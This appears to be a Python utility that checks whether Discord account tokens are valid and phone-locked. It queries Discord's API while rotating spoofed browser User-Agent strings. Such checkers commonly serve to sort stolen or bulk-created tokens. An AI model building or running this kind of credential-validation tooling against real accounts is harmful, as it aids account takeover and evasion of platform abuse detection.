import requests
from time import sleep
import random
from colorama import Fore

heads = [
    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0",
    },
    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    },
    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    },
    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0",
    },
    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
    },
    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
    },
]

def getheaders(token=None):
    headers = random.choice(heads)
    if token:
        headers.update({"Authorization": token})
    return headers

def validateToken(token):
    """validate the token by contacting the discord api"""
    base_url = "https://discord.com/api/v9/users/@me"
    message = "You need to verify your account in order to perform this action."
    r = requests.get(base_url, headers=getheaders(token))
  
    if r.status_code != 200:
        print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
        sleep(1.5)
        exit()
        
    else:
        invalid = False
    j = requests.get(
        f"{base_url}/billing/subscriptions", headers=getheaders(token)
    ).json()
    # check if the account is phone locked
    try:
        if j["message"] == message:
            print(f"\n{Fore.RED}Phone Locked Token.{Fore.RESET}")
            sleep(1)
    except (KeyError, TypeError, IndexError):
        pass
        return token